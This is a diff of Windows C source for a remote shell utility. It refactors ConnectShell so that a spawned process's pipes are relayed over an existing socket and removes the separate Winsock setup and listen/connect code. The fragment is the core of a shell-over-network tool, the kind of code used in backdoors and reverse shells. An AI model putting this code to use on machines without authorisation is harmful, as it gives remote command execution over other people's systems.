@@ -1,66 +1,22 @@
 #include "RemoteShell.h"
 
-int initialization()
-{
-    WSADATA wsadata;
+int DataSend(SOCKET s, char *Buffer);
+int DataRecv(SOCKET s, char *Buffer);
 
-    if (WSAStartup(MAKEWORD(2, 2), &wsadata) != 0)
-    {
-        printf("[-] WSAStartup failed!\n");
-        printf("[+] GetLastError : %d\n", GetLastError());
-        return 0;
-    }
-
-    return 1;
-}
-
-int ListenShell(char *path, SOCKADDR_IN sockaddr)
-{
-    SOCKET sock = NULL;
-    
-    if (initialization() == 0)
-    {
-        return 0;
-    }
-
-    sock = socket(sockaddr.sin_family, SOCK_STREAM, IPPROTO_TCP);
-
-    if (sock == INVALID_SOCKET)
-    {
-        printf("[-] Create socket failed!\n");
-        printf("[+] GetLastError : %d\n", GetLastError());
-        return 0;
-    }
-}
-
-int ConnectShell(char *path, SOCKADDR_IN sockaddr)
+int ConnectShell(char *path, SOCKET s, HANDLE hEvent)
 {
     IPC_PIPE IpcPipe;
-    SOCKET sock = NULL;
-    
-    if (initialization() == 0)
+
+    if (hEvent == NULL)
     {
-        return 0;
+        printf("[*] Socket event not found!\n");
+        hEvent = WSACreateEvent();
+        WSAEventSelect(s, hEvent, FD_READ | FD_CLOSE);
     }
-
-    sock = socket(sockaddr.sin_family, SOCK_STREAM, IPPROTO_TCP);
-
-    if (sock == INVALID_SOCKET)
+    else
     {
-        printf("[-] Create socket failed!\n");
-        printf("[+] GetLastError : %d\n", GetLastError());
-        return 0;
+        printf("[*] Socket event found!\n");
     }
-
-    if (connect(sock, (const struct sockaddr *)&sockaddr, sizeof(sockaddr)) == SOCKET_ERROR)
-    {
-        printf("[-] %s:%d Connect failed!\n", inet_ntoa(sockaddr.sin_addr), htons(sockaddr.sin_port));
-        printf("[+] GetLastError : %d\n", GetLastError());
-        return 0;
-    }
-
-    HANDLE hEvent = WSACreateEvent();
-    WSAEventSelect(sock, hEvent, FD_READ | FD_CLOSE);
 
     HANDLE hProcess = ProcessStart(path, &IpcPipe);
 
@@ -74,11 +30,14 @@ int ConnectShell(char *path, SOCKADDR_IN sockaddr)
         {
             ReadFile(IpcPipe.hParentRead, Buffer, sizeof(Buffer), &dwRead, NULL);
             Buffer[dwRead] = NULL;
-            DataSend(sock, Buffer);
+            // printf("%s", Buffer);
+            DataSend(s, Buffer);
         }
 
-        WSANETWORKEVENTS NetworkEvents = { 0, };
-        if (WSAEnumNetworkEvents(sock, hEvent, &NetworkEvents) == SOCKET_ERROR)
+        WSANETWORKEVENTS NetworkEvents = {
+            0,
+        };
+        if (WSAEnumNetworkEvents(s, hEvent, &NetworkEvents) == SOCKET_ERROR)
         {
             printf("[-] WSAEnumNetworkEvents failed!\n");
             printf("[+] GetLastError : %d\n", GetLastError());
@@ -87,7 +46,7 @@ int ConnectShell(char *path, SOCKADDR_IN sockaddr)
 
         if (NetworkEvents.lNetworkEvents & FD_READ)
         {
-            DataRecv(sock, Buffer);
+            DataRecv(s, Buffer);
             WriteFile(IpcPipe.hParentWrite, Buffer, strlen(Buffer), NULL, NULL);
         }
         else if (NetworkEvents.lNetworkEvents & FD_CLOSE)
@@ -99,13 +58,13 @@ int ConnectShell(char *path, SOCKADDR_IN sockaddr)
         if (WaitForSingleObject(hProcess, 0) == 0)
         {
             printf("[*] Process terminated!\n");
-            DataSend(sock, "[*] Process terminated!");
+            DataSend(s, "[*] Process terminated!");
             break;
         }
     }
 
     TerminateProcess(hProcess, 0);
-    closesocket(sock);
+    closesocket(s);
     CloseHandle(hEvent);
 }
 
@@ -119,7 +78,7 @@ HANDLE ProcessStart(char *path, IPC_PIPE *IpcPipe)
     sa.nLength = sizeof(SECURITY_ATTRIBUTES);
     sa.bInheritHandle = TRUE;
     sa.lpSecurityDescriptor = NULL;
-    
+
     CreatePipe(&IpcPipe->hChildRead, &IpcPipe->hParentWrite, &sa, 0);
     CreatePipe(&IpcPipe->hParentRead, &IpcPipe->hChildWrite, &sa, 0);
 
